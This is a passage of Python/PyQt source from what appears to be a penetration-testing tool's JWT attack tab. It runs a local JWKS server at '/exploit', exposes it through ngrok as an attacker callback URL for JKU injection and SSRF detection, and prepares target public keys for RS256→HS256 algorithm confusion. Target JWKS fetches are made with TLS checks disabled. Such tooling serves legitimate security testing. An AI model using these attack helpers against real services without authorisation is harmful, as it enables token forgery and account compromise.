        self._srv_key_data = key if idx >= 0 and idx < len(self._managed_keys) else None

        # Save JWKS JSON for automatic port-retry and reset retry counter
        self._srv_jwks_json = jwks_json
        self._srv_port_retry = 0

        # Stop any existing server first
        if self._local_jwks_server and self._local_jwks_server.isRunning():
            self._km_srv_stop()

        self._local_jwks_server = LocalJWKSServer(port, path, jwks_json, parent=self)
        self._local_jwks_server.request_received.connect(self._km_srv_on_request)
        self._local_jwks_server.server_started.connect(self._km_srv_on_started)
        self._local_jwks_server.server_error.connect(self._km_srv_on_error)
        self._local_jwks_server.start()

        # Optimistic UI update (confirmed by server_started signal)
        self.km_srv_status_lbl.setText("◌ Starting …")
        self.km_srv_status_lbl.setStyleSheet(
            f"color:{COLOR_WARNING}; font-weight:bold;"
        )

    def _km_srv_stop(self):
        """Stop the local JWKS HTTP server and ensure the socket is fully released."""
        if self._local_jwks_server:
            self._local_jwks_server.stop()   # shutdown() + server_close()
            self._local_jwks_server.wait(5000)  # wait up to 5 s for thread to exit
            self._local_jwks_server = None
        self._srv_key_data = None
        self.km_srv_status_lbl.setText("● Stopped")
        self.km_srv_status_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED}; font-weight:bold;"
        )
        self._set_status("Local JWKS server stopped.", COLOR_TEXT_MUTED)

    def _km_ngrok_start(self):
        """Start the local JWKS server then expose it via an ngrok tunnel."""
        # Auto-start the local server first
        self._km_srv_start()
        # Abort if server startup was cancelled (e.g. no key and user declined)
        if self._local_jwks_server is None:
            return

        port = self.km_srv_port.value()
        path = self.km_srv_path.text().strip() or "/exploit"
        if not path.startswith("/"):
            path = "/" + path
        # Read ngrok authtoken from global app settings (Tools → Settings → Tokens)
        _settings_parent = self._parent_gui
        auth_token = ""
        if _settings_parent is not None:
            auth_token = getattr(_settings_parent, "_global_settings", {}).get("ngrok_authtoken", "")

        # Stop any existing tunnel first
        if self._ngrok_tunnel and self._ngrok_tunnel.isRunning():
            self._km_ngrok_stop()

        self._ngrok_tunnel = NgrokTunnel(port, auth_token, parent=self)
        self._ngrok_tunnel.tunnel_ready.connect(self._km_ngrok_on_ready)
        self._ngrok_tunnel.tunnel_error.connect(self._km_ngrok_on_error)
        self._ngrok_tunnel.tunnel_stopped.connect(self._km_ngrok_on_stopped)
        self._ngrok_tunnel.tunnel_log.connect(self.km_srv_log.append)
        self._ngrok_tunnel.start()

        self.km_ngrok_start_btn.setEnabled(False)
        self.km_ngrok_url_lbl.setText("Public URL:  ◌ Starting …")
        self.km_ngrok_url_lbl.setStyleSheet("color:#E5C07B;")
        self._set_status("Starting ngrok tunnel …", COLOR_WARNING)

    def _km_ngrok_stop(self):
        """Tear down the ngrok tunnel and stop the local JWKS server."""
        # Stop the local server immediately — do this first, unconditionally,
        # so the port is freed even if the tunnel teardown hangs.
        self._km_srv_stop()
        if self._ngrok_tunnel:
            self._ngrok_tunnel.stop()
            self._ngrok_tunnel.wait(3000)
            self._ngrok_tunnel = None
        self.km_ngrok_start_btn.setEnabled(True)
        self.km_ngrok_stop_btn.setEnabled(False)
        self.km_ngrok_url_lbl.setText("Public URL:  —")
        self.km_ngrok_url_lbl.setStyleSheet("color:#4A90D9;")

    @pyqtSlot(str)
    def _km_ngrok_on_ready(self, public_url: str):
        """Called when the ngrok tunnel is established."""
        path = self.km_srv_path.text().strip() or "/exploit"
        if not path.startswith("/"):
            path = "/" + path
        full_url = public_url.rstrip("/") + path
        self.km_ngrok_url_lbl.setText(f"Public URL:  {full_url}")
        self.km_ngrok_url_lbl.setStyleSheet("color:#4A90D9; font-weight:bold;")
        self.km_ngrok_start_btn.setEnabled(False)
        self.km_ngrok_stop_btn.setEnabled(True)
        if self.km_ngrok_autofill_cb.isChecked():
            self.attacker_url_edit.setText(full_url)
        self.km_srv_log.append(
            f"[{__import__('datetime').datetime.now().strftime('%H:%M:%S')}]"
            f"  Ngrok tunnel active  →  {full_url}"
        )
        self._set_status(
            f"Ngrok tunnel ready: {full_url}",
            COLOR_SUCCESS,
        )

    @pyqtSlot(str)
    def _km_ngrok_on_error(self, error: str):
        """Called when ngrok fails to start or dies unexpectedly."""
        # Stop the local server that was auto-started — tunnel failed so no point serving
        self._km_srv_stop()
        self.km_ngrok_start_btn.setEnabled(True)
        self.km_ngrok_stop_btn.setEnabled(False)
        self.km_ngrok_url_lbl.setText("Public URL:  ✕ Error")
        self.km_ngrok_url_lbl.setStyleSheet(f"color:{COLOR_CRITICAL};")
        self._set_status(f"Ngrok error: {error}", COLOR_CRITICAL)


    @pyqtSlot()
    def _km_ngrok_on_stopped(self):
        """Called when the tunnel is cleanly stopped — also tear down the local server."""
        self.km_ngrok_url_lbl.setText("Public URL:  —")
        self.km_ngrok_url_lbl.setStyleSheet("color:#4A90D9;")
        self.km_ngrok_start_btn.setEnabled(True)
        self.km_ngrok_stop_btn.setEnabled(False)
        # Stop the local JWKS server that was auto-started with the tunnel
        self._km_srv_stop()

    @pyqtSlot(str)
    def _km_srv_on_started(self, url: str):
        """Called when the server successfully binds and starts serving."""
        self.km_srv_status_lbl.setText("● Running")
        self.km_srv_status_lbl.setStyleSheet(
            f"color:{COLOR_SUCCESS}; font-weight:bold;"
        )
        self.km_srv_log.append(
            f"[{__import__('datetime').datetime.now().strftime('%H:%M:%S')}]"
            f"  Server started  →  {url}"
        )
        self._set_status(
            f"Local JWKS server running at {url}  —  run JKU attack to detect callback",
            COLOR_SUCCESS,
        )

    @pyqtSlot(str)
    def _km_srv_on_error(self, error: str):
        """Called when the server fails to start. Auto-retries next port on EADDRINUSE."""
        # Auto-bump port up to 10 times when the current port is occupied
        if ("address already in use" in error.lower() or "[errno 98]" in error.lower())\
                and self._srv_port_retry < 10:
            self._srv_port_retry += 1
            new_port = self.km_srv_port.value() + 1
            self.km_srv_port.setValue(new_port)
            path = self.km_srv_path.text().strip() or "/exploit"
            if not path.startswith("/"):
                path = "/" + path
            self.km_srv_status_lbl.setText(f"◌ Retrying port {new_port} …")
            self.km_srv_status_lbl.setStyleSheet(f"color:{COLOR_WARNING}; font-weight:bold;")
            self._set_status(f"Port busy — retrying on {new_port} …", COLOR_WARNING)
            # Clean up the failed thread before spawning a new one
            if self._local_jwks_server:
                self._local_jwks_server.wait(500)
                self._local_jwks_server = None
            self._local_jwks_server = LocalJWKSServer(new_port, path, self._srv_jwks_json, parent=self)
            self._local_jwks_server.request_received.connect(self._km_srv_on_request)
            self._local_jwks_server.server_started.connect(self._km_srv_on_started)
            self._local_jwks_server.server_error.connect(self._km_srv_on_error)
            self._local_jwks_server.start()
            return
        self.km_srv_status_lbl.setText("✗ Error")
        self.km_srv_status_lbl.setStyleSheet(
            f"color:{COLOR_CRITICAL}; font-weight:bold;"
        )
        self._set_status(f"JWKS server error: {error}", COLOR_CRITICAL)
        QMessageBox.critical(
            self, "JWKS Server Error",
            f"Could not start local JWKS server:\n\n{error}\n\n"
            "Try a different port if the current one is already in use."
        )

    @pyqtSlot(str, str, str, str, str)
    def _km_srv_on_request(self, ts: str, ip: str, method: str, path: str, ua: str):
        """Called for every incoming HTTP request — logs the hit in the access log."""
        entry = f"[{ts}]  {method} {path}  ←  {ip}  ({ua[:70]})"
        self.km_srv_log.append(entry)
        # Scroll to bottom so the latest hit is visible
        self.km_srv_log.verticalScrollBar().setValue(
            self.km_srv_log.verticalScrollBar().maximum()
        )
        self._set_status(
            f"JWKS server hit!  {method} from {ip}  —  JKU SSRF callback confirmed!",
            COLOR_CRITICAL,
        )

    def _km_delete_key(self):
        """Remove the currently selected key from the store and table."""
        idx = self.km_table.currentRow()
        if idx < 0 or idx >= len(self._managed_keys):
            return
        kid = self._managed_keys[idx].get("kid", "")
        self._managed_keys.pop(idx)
        self.km_table.removeRow(idx)
        for v in [self.km_jwk_pub_view, self.km_jwk_priv_view,
                  self.km_pem_pub_view, self.km_pem_priv_view]:
            v.clear()
        self._set_status(f"Deleted key  kid={kid}")
        self._refresh_jku_key_combo()

    # ── Attack Config: RS256→HS256 key conversion helpers ───────────────

    def _set_pubkey_convert_status(self, text: str, ok: bool = False):
        if not hasattr(self, "_pubkey_convert_status"):
            return
        color = COLOR_SUCCESS if ok else COLOR_WARNING
        self._pubkey_convert_status.setText(text)
        self._pubkey_convert_status.setStyleSheet(f"color:{color}; font-size:8pt;")

    def _convert_attack_pubkey(self):
        """
        Convert pasted JWK/PEM into normalized PEM and base64(k) used by
        algorithm-confusion workflows. Preserves the trailing newline in PEM bytes.
        """
        if not hasattr(self, "pubkey_input_edit"):
            return

        raw = self.pubkey_input_edit.toPlainText().strip()
        if not raw:
            self._set_pubkey_convert_status("No key pasted", ok=False)
            return

        pem = ""
        # JWK / JWKS JSON path
        if raw.startswith("{"):
            try:
                obj = json.loads(raw)
                if isinstance(obj, dict) and "keys" in obj:
                    keys = obj.get("keys") or []
                    if not keys or not isinstance(keys[0], dict):
                        raise ValueError("JWKS has no key entries")
                    obj = keys[0]
                if not isinstance(obj, dict) or obj.get("kty") != "RSA":
                    raise ValueError("Only RSA JWK keys are supported")
                pem = _jwk_rsa_to_pem(obj)
            except Exception as exc:
                self._set_pubkey_convert_status(f"JWK parse error: {exc}", ok=False)
                return
        else:
            # PEM path: normalize to SubjectPublicKeyInfo PEM
            try:
                from cryptography.hazmat.primitives.serialization import (
                    load_pem_public_key,
                    Encoding,
                    PublicFormat,
                )
                from cryptography.hazmat.backends import default_backend

                pub = load_pem_public_key(raw.encode("utf-8"), backend=default_backend())
                pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode("ascii")
            except Exception as exc:
                self._set_pubkey_convert_status(f"Unrecognized key format: {exc}", ok=False)
                return

        pem = pem.strip() + "\n"
        k_val = base64.b64encode(pem.encode("utf-8")).decode("ascii")
        self.pubkey_edit.setPlainText(pem)
        if hasattr(self, "pubkey_k_edit"):
            self.pubkey_k_edit.setText(k_val)
        self._set_pubkey_convert_status("Converted", ok=True)

    # ── JWKS fetch helpers ────────────────────────────────────────────────

    def _fetch_pem_from_url(self, url: str) -> str:
        """Fetch a JWKS from *url*, pick the first RSA key, return PEM. Raises on failure."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            url, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            body = resp.read().decode(errors="replace")
        data = json.loads(body)
        if isinstance(data, dict) and "keys" in data:
            candidates = data["keys"]
        elif isinstance(data, dict):
            candidates = [data]
        else:
            candidates = []
        rsa_keys = [k for k in candidates if isinstance(k, dict) and k.get("kty") == "RSA"]
        if not rsa_keys:
            raise ValueError("No RSA keys found in JWKS response")
        return _jwk_rsa_to_pem(rsa_keys[0])

    def _fetch_server_pubkey(self):
        """Fetch RSA public key by probing standard JWKS paths on the target host."""
        host = self.host_edit.text().strip()
        if not host:
            QMessageBox.warning(self, "No Host", "Enter the target host in the top bar.")
            return
        port = self.port_spin.value()
        scheme = "https" if self.https_cb.isChecked() else "http"
        candidates = [
            f"{scheme}://{host}:{port}/jwks.json",
            f"{scheme}://{host}:{port}/.well-known/jwks.json",
        ]
        errors: list = []

        for url in candidates:
            try:
                pem = self._fetch_pem_from_url(url)
                self.pubkey_edit.setPlainText(pem)
                QMessageBox.information(
                    self, "JWKS Fetched",
                    f"RSA public key fetched from:\n{url}\n\n"
                    "PEM has been filled into the RSA PubKey field.\n"
                    "You can now run the RS256\u2192HS256 algorithm confusion attack."
                )
                return
            except Exception as exc:
                errors.append(f"{url} \u2014 {exc}")

        QMessageBox.warning(
            self, "JWKS Fetch Failed",
            "Could not retrieve an RSA public key.\n\n"
            + "\n".join(errors)
            + "\n\nYou can paste the PEM manually, or import a JWK via the Key Manager tab."
        )

    def _km_use_pubkey(self):
        """Copy the selected key's PEM public key into the RSA PubKey attack field."""
        idx = self.km_table.currentRow()
        if idx < 0 or idx >= len(self._managed_keys):
            return
        key = self._managed_keys[idx]
        pem = key.get("_pem_pub", "")
        if not pem or pem.startswith("("):
            QMessageBox.information(self, "No PEM Public Key",
                "The selected key has no PEM public key.\n"
                "Symmetric (oct) keys cannot be used as RSA public keys.")
            return
        if hasattr(self, "pubkey_input_edit"):
            self.pubkey_input_edit.setPlainText(pem)
            self._convert_attack_pubkey()
        else:
            self.pubkey_edit.setPlainText(pem)
        self._set_status(
            f"Public key (kid={key.get('kid','')}) → RSA PubKey field.", COLOR_SUCCESS
        )

    def _km_import_jwk(self):
        """Import a JWK object or JWKS {"keys":[...]} JSON pasted by the user."""
        dlg = QDialog(self)
        dlg.setWindowTitle("Import JWK / JWKS")
        dlg.setModal(True)
        dlg.setMinimumSize(520, 320)
        _lay = QVBoxLayout(dlg)
        lbl = QLabel('Paste a JWK object or JWKS {"keys":[...]} JSON below:')
        lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:9pt;")
        _lay.addWidget(lbl)
        txt = QTextEdit()
        txt.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        txt.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT}; border:1px solid {COLOR_BORDER};"
        )
        JSONHighlighter(txt.document())
        _lay.addWidget(txt)
        btns = QHBoxLayout()
        ok_btn = QPushButton("Import")
        ok_btn.setStyleSheet(self._btn_style(COLOR_ACCENT))
        ok_btn.clicked.connect(dlg.accept)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        cancel_btn.clicked.connect(dlg.reject)
        btns.addWidget(ok_btn)
        btns.addWidget(cancel_btn)
        _lay.addLayout(btns)
        if dlg.exec_() != QDialog.Accepted:
            return
        raw = txt.toPlainText().strip()
        try:
            obj = json.loads(raw)
            jwks = obj.get("keys", [obj]) if isinstance(obj, dict) else []
            imported = 0
            for jwk_obj in jwks:
                kty = jwk_obj.get("kty", "?")
                _type = {"RSA": "RSA", "EC": "EC", "oct": "Symmetric", "OKP": "OKP"}.get(kty, kty)
                pem_pub = ""; pem_priv = ""
                # Attempt PEM extraction when cryptography is available
                try:
                    from cryptography.hazmat.primitives import serialization as _ser
                    from cryptography.hazmat.backends import default_backend
                    import base64 as _b64m
                    def _b2i(s):
                        s = s.replace("-", "+").replace("_", "/")
                        s += "=" * ((4 - len(s) % 4) % 4)
                        return int.from_bytes(_b64m.b64decode(s), "big")
                    if kty == "RSA" and "n" in jwk_obj and "e" in jwk_obj:
                        from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
                        pub_key = _rsa.RSAPublicNumbers(_b2i(jwk_obj["e"]), _b2i(jwk_obj["n"])).public_key(default_backend())
                        pem_pub = pub_key.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
                        if "d" in jwk_obj:
                            priv_key = _rsa.RSAPrivateNumbers(
                                _b2i(jwk_obj["p"]), _b2i(jwk_obj["q"]), _b2i(jwk_obj["d"]),
                                _b2i(jwk_obj["dp"]), _b2i(jwk_obj["dq"]), _b2i(jwk_obj["qi"]),
                                _rsa.RSAPublicNumbers(_b2i(jwk_obj["e"]), _b2i(jwk_obj["n"]))
                            ).private_key(default_backend())
                            pem_priv = priv_key.private_bytes(
                                _ser.Encoding.PEM, _ser.PrivateFormat.TraditionalOpenSSL, _ser.NoEncryption()
                            ).decode()
                except Exception:
                    pass
                key_data = {
                    "_type": _type, "_size": "imported",
                    "kty": kty, "alg": jwk_obj.get("alg", ""),
                    "kid": jwk_obj.get("kid", f"imported-{imported}"),
                    "_pub_jwk":  {k: v for k, v in jwk_obj.items() if k not in ("d", "dp", "dq", "p", "q", "qi")},
                    "_priv_jwk": jwk_obj,
                    "_pem_pub":  pem_pub,
                    "_pem_priv": pem_priv,
                }
                self._km_add_key(key_data)
                imported += 1
            self._set_status(f"Imported {imported} key(s) from JWK.", COLOR_SUCCESS)
        except json.JSONDecodeError as exc:
            QMessageBox.warning(self, "Parse Error", f"Invalid JSON:\n{exc}")

    def _km_import_pem(self):
        """Import a PEM key file from disk."""
        path, _ = QFileDialog.getOpenFileName(
            self, "Import PEM Key", "",
            "PEM Files (*.pem *.key *.crt *.cer);;All Files (*)"
        )
        if not path:
            return
        try:
            with open(path, "rb") as fh:
                pem_bytes = fh.read()
            from cryptography.hazmat.primitives import serialization as _ser
            from cryptography.hazmat.backends import default_backend
            import uuid as _uuid
            kid = str(_uuid.uuid4())
            pem_pub = ""
            pem_priv = ""
            pub_jwk: dict = {}
            priv_jwk: dict = {}
            ktype = "Unknown"
            alg = ""
            key_size = "imported"
            def _i2b(n, nbytes=None):
                if nbytes is None:
                    nbytes = (n.bit_length() + 7) // 8
                return _b64url_encode(n.to_bytes(nbytes, "big"))
            try:
                priv = _ser.load_pem_private_key(pem_bytes, password=None, backend=default_backend())
                pub  = priv.public_key()
                pem_pub  = pub.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
                pem_priv = priv.private_bytes(_ser.Encoding.PEM, _ser.PrivateFormat.TraditionalOpenSSL,
                                              _ser.NoEncryption()).decode()
                from cryptography.hazmat.primitives.asymmetric import rsa as _rsa, ec as _ec
                if isinstance(priv, _rsa.RSAPrivateKey):
                    ktype = "RSA"; alg = "RS256"; key_size = f"{priv.key_size}-bit"
                    pn = pub.public_numbers()
                    pub_jwk  = {"kty":"RSA","alg":alg,"use":"sig","kid":kid,"n":_i2b(pn.n),"e":_i2b(pn.e)}
                    prvn = priv.private_numbers()
                    priv_jwk = dict(pub_jwk)
                    priv_jwk.update({"d":_i2b(prvn.d),"p":_i2b(prvn.p),"q":_i2b(prvn.q),
                                     "dp":_i2b(prvn.dmp1),"dq":_i2b(prvn.dmq1),"qi":_i2b(prvn.iqmp)})
                elif isinstance(priv, _ec.EllipticCurvePrivateKey):
                    ktype = "EC"
                    _cmap = {256:"P-256",384:"P-384",521:"P-521"}
                    crv = _cmap.get(priv.key_size, "P-256")
                    alg = {"P-256":"ES256","P-384":"ES384","P-521":"ES512"}[crv]
                    key_size = crv
                    clen = {"P-256":32,"P-384":48,"P-521":66}[crv]
                    pn = pub.public_numbers()
                    pub_jwk  = {"kty":"EC","crv":crv,"alg":alg,"use":"sig","kid":kid,
                                "x":_i2b(pn.x,clen),"y":_i2b(pn.y,clen)}
                    priv_jwk = dict(pub_jwk)
                    priv_jwk["d"] = _i2b(priv.private_numbers().private_value, clen)
            except Exception:
                pub = _ser.load_pem_public_key(pem_bytes, backend=default_backend())
                pem_pub = pub.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
                from cryptography.hazmat.primitives.asymmetric import rsa as _rsa, ec as _ec
                if isinstance(pub, _rsa.RSAPublicKey):
                    ktype = "RSA"; alg = "RS256"; key_size = f"{pub.key_size}-bit"
                    pn = pub.public_numbers()
                    pub_jwk = {"kty":"RSA","alg":alg,"use":"sig","kid":kid,"n":_i2b(pn.n),"e":_i2b(pn.e)}
                    priv_jwk = pub_jwk
                elif isinstance(pub, _ec.EllipticCurvePublicKey):
                    ktype = "EC"
                    _cmap = {256:"P-256",384:"P-384",521:"P-521"}
                    crv = _cmap.get(pub.key_size, "P-256")
                    alg = {"P-256":"ES256","P-384":"ES384","P-521":"ES512"}[crv]
                    key_size = crv
                    clen = {"P-256":32,"P-384":48,"P-521":66}[crv]
                    pn = pub.public_numbers()
                    pub_jwk = {"kty":"EC","crv":crv,"alg":alg,"use":"sig","kid":kid,
                               "x":_i2b(pn.x,clen),"y":_i2b(pn.y,clen)}
                    priv_jwk = pub_jwk
            key_data = {
                "_type": ktype, "_size": key_size,
                "kty": pub_jwk.get("kty", "?"), "alg": alg, "kid": kid,
                "_pub_jwk": pub_jwk, "_priv_jwk": priv_jwk,
                "_pem_pub": pem_pub, "_pem_priv": pem_priv,
            }
            self._km_add_key(key_data)
            self._set_status(f"Imported PEM key from {path}  kid={kid}", COLOR_SUCCESS)
        except ImportError:
            QMessageBox.warning(self, "Missing Dependency",
                "PEM import requires the 'cryptography' package.\n"
                "Install with:  pip install cryptography")
        except Exception as exc:
            QMessageBox.warning(self, "Import Error", str(exc))

    def _set_status(self, text: str, color: str = COLOR_TEXT_MUTED):
        self.status_lbl.setText(text)
        self.status_lbl.setStyleSheet(f"color:{color}; font-size:9pt; padding:2px 4px;")

    # ─────────────────────────────────────────────────────────────────────
    # Public API  (called by HTTP History "Send to JWT" and integration code)
    # ─────────────────────────────────────────────────────────────────────

    def load_request(self, raw_request: str, host: str = "",
                     port: int = 443, is_https: bool = True):
        """
        Called by HTTP History's 'Send to JWT' menu action.
        Populates the request editor and auto-parses the JWT.
        """
        self.request_edit.setPlainText(raw_request)
        if host:
            self.host_edit.setText(host)
        self.port_spin.setValue(port)
        self.https_cb.setChecked(is_https)
        # Auto-parse
        self.parse_jwt()
        self._set_status(
            f"[<<]  Loaded from HTTP History — {host or '(host from header)'}",
            COLOR_ACCENT,
        )
